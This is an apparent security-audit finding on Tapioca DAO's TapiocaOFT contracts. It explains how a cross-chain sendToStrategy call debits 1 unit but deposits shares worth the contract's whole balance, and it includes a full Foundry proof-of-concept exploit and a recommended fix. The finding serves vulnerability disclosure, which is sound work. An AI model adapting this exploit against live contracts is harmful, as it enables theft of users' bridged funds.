[H-14] All assets of (m)TapiocaOFT can be stealed by depositing to strategy cross chain call with 1 amount but maximum shares possible
Submitted by0x73696d616f
https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/BaseTOFT.sol#L224
https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/BaseTOFT.sol#L450
https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTStrategyModule.sol#L47
https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTStrategyModule.sol#L58
https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTStrategyModule.sol#L154
https://github.com/Tapioca-DAO/tapiocaz-audit/blob/bcf61f79464cfdc0484aa272f9f6e28d5de36a8f/contracts/tOFT/modules/BaseTOFTStrategyModule.sol#L181-L185
https://github.com/Tapioca-DAO/YieldBox/blob/f5ad271b2dcab8b643b7cf622c2d6a128e109999/contracts/YieldBox.sol#L118
Attacker can be debited only the least possible amount (1) but send theshareargument as the maximum possible value corresponding to theercbalance of(m)TapiocaOFT. This would enable the attacker to steal all theercbalance of the(m)TapiocaOFTcontract.
Proof of Concept
InBaseTOFT,SendToStrategy(), has no validation and just delegate calls tosendToStrategy()function of theBaseTOFTStrategyModule.
In the mentioned module, the quantity debited from the user is theamountargument, having no validation in the correspondingshareamount:
functionsendToStrategy(address_from,address_to,uint256amount,uint256share,uint256assetId,uint16lzDstChainId,ICommonData.ISendOptionscalldataoptions)externalpayable{require(amount>0,"TOFT_0");bytes32toAddress=LzLib.addressToBytes32(_to);_debitFrom(_from,lzEndpoint.getChainId(),toAddress,amount);...
Then, a payload is sent to the destination chain in_lzSend()of typePT_YB_SEND_STRAT.
Again, inBaseTOFT, the function_nonBlockingLzReceive()handles the received message and delegate calls to theBaseTOFTStrategyModule, functionstrategyDeposit(). In this, function, among other things, it delegate calls todepositToYieldbox(), of the same module:
functiondepositToYieldbox(uint256_assetId,uint256_amount,uint256_share,IERC20_erc20,address_from,address_to)public{_amount=_share>0?yieldBox.toAmount(_assetId,_share,false):_amount;_erc20.approve(address(yieldBox),_amount);yieldBox.depositAsset(_assetId,_from,_to,_amount,_share);}
The_shareargument is the one the user initially provided in the source chain; however, the_amount, is computed from theyieldBoxratio, effectively overriding the specifiedamountin the source chain of1. This will credit funds to the attacker from other users that bridged assets through(m)TapiocaOFT.
The following POC in Foundry demonstrates how an attacker can be debited on the source chain an amount of1but calldepositAsset()on the destination chain with an amount of2e18, the available in theTapiocaOFTcontract.
// SPDX-License-Identifier: UNLICENSEDpragmasolidity^0.8.18;import{Test,console}from"forge-std/Test.sol";import{TapiocaOFT}from"contracts/tOFT/TapiocaOFT.sol";import{BaseTOFTStrategyModule}from"contracts/tOFT/modules/BaseTOFTStrategyModule.sol";import{IYieldBoxBase}from"tapioca-periph/contracts/interfaces/IYieldBoxBase.sol";import{ISendFrom}from"tapioca-periph/contracts/interfaces/ISendFrom.sol";import{ICommonData}from"tapioca-periph/contracts/interfaces/ICommonData.sol";import{ERC20}from"@openzeppelin/contracts/token/ERC20/ERC20.sol";contractMockYieldBoxisTest{functiondepositAsset(uint256assetId,addressfrom,addressto,uint256amount,uint256share)externalpayablereturns(uint256,uint256) {}functiontoAmount(uint256,uint256share,bool)externalpurereturns(uint256amount) {// real formula amount = share._toAmount(totalSupply[assetId], _tokenBalanceOf(assets[assetId]), roundUp);// assume ratio is 1:1returnshare;}}contractTapiocaOFTPOCisTest{addresspublicconstantLZ_ENDPOINT=0x66A71Dcef29A0fFBDBE3c6a460a3B5BC225Cd675;uint16internalconstantPT_YB_SEND_STRAT=770;functiontest_POC_SendToStrategy_WithoutAllDebitedFrom()public{vm.createSelectFork("https://eth.llamarpc.com");addressmockERC20_=address(newERC20("mockERC20","MERC20"));addressstrategyModule_=address(newBaseTOFTStrategyModule(address(LZ_ENDPOINT),address(0),IYieldBoxBase(address(2)),"SomeName","SomeSymbol",18,block.chainid));addressmockYieldBox_=address(newMockYieldBox());TapiocaOFTtapiocaOft_=newTapiocaOFT(LZ_ENDPOINT,mockERC20_,IYieldBoxBase(mockYieldBox_),"SomeName","SomeSymbol",18,block.chainid,payable(address(1)),payable(strategyModule_),payable(address(3)),payable(address(4)));// some user wraps 2e18 mock erc20addressuser_=makeAddr("user");deal(mockERC20_,user_,2e18);vm.startPrank(user_);ERC20(mockERC20_).approve(address(tapiocaOft_),2e18);tapiocaOft_.wrap(user_,user_,2e18);vm.stopPrank();addressattacker_=makeAddr("attacker");deal(attacker_,1e18);// lz feesaddressfrom_=attacker_;addressto_=attacker_;uint256amount_=1;uint256share_=2e18;// steal all available funds in (m)Tapioca (only 1 user with 2e18)uint256assetId_=1;uint16lzDstChainId_=102;addresszroPaymentAddress_=address(0);ICommonData.ISendOptionsmemoryoptions_=ICommonData.ISendOptions(200_000,zroPaymentAddress_);tapiocaOft_.setTrustedRemoteAddress(lzDstChainId_,abi.encodePacked(tapiocaOft_));// attacker is only debited 1 amount, but specifies 2e18 shares, a possibly much bigger corresponding amountdeal(mockERC20_,attacker_,1);vm.startPrank(attacker_);ERC20(mockERC20_).approve(address(tapiocaOft_),1);tapiocaOft_.wrap(attacker_,attacker_,1);tapiocaOft_.sendToStrategy{value:1ether}(from_,to_,amount_,share_,assetId_,lzDstChainId_,options_);vm.stopPrank();bytesmemorylzPayload_=abi.encode(PT_YB_SEND_STRAT,bytes32(uint256(uint160(from_))),attacker_,amount_,share_,assetId_,zroPaymentAddress_);// attacker was debited from 1 amount, but deposit sends an amount of 2e18vm.expectCall(address(mockYieldBox_),0,abi.encodeCall(MockYieldBox.depositAsset, (assetId_,address(tapiocaOft_),attacker_,2e18,2e18)));vm.prank(LZ_ENDPOINT);tapiocaOft_.lzReceive(102,abi.encodePacked(tapiocaOft_,tapiocaOft_),0,lzPayload_);}}
Tools Used
Vscode, Foundry
Recommended Mitigation Steps
Given that it’s impossible to fetch theYieldBoxratio in the source chain, it’s best to stick with the amount only and remove theshareargument in the cross chainsendToStrategy()function call.
0xRektora (Tapioca) confirmed